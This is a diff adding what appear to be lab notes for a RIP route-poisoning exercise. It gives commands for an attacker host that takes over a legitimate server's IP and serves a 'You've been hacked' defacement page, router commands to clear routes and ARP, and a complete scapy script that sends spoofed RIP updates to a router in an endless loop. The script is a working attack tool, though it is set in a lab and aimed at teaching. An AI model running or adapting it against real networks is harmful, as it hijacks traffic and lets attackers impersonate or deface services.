@@ -1,0 +1,51 @@
+rui-valadas
+	ip addr add 20.0.0.18/32 dev eth0
+	service nginx start
+	nano /var/www/html/index.html                                                                              
+	<h1>You've been hacked by RIP poisoning heheheh</h1>
+
+Legit Server
+	service nginx start
+
+Routers:
+To check if the route includes 20.0.0.10 as source to reach 20.0.0.18
+	show ip route rip
+	
+To erase route to restart the search
+	clear ip route *
+
+Clear arp for better http choice by the router
+	clear arp
+
+	
+	
+	
+nano rip_poison.py 
+                                                                                                                                                                                 
+from scapy.all import *
+import time
+
+# Settings
+iface = "eth0"
+target_ip = "20.0.0.9"         # IP of R2
+spoofed_network = "20.0.0.18"  # IP of LegitServer
+netmask = "255.255.255.255"    # /32
+metric = 1
+
+# Build RIP entry without nexthop
+rip_entry = RIPEntry(
+    AF=2,
+    RouteTag=0,
+    addr=spoofed_network,
+    mask=netmask,
+    metric=metric
+)
+
+# Build RIP response packet
+rip_response = IP(src="20.0.0.10", dst=target_ip)/UDP(sport=520, dport=520)/RIP(cmd=2, version=2)/rip_entry
+
+# Loop to send poisoned RIP updates
+print(f"Poisoning R2 ({target_ip}) to redirect {spoofed_network}/32 via attacker (20.0.0.18)...")
+while True:
+    send(rip_response, iface=iface, verbose=False)
+    time.sleep(5)
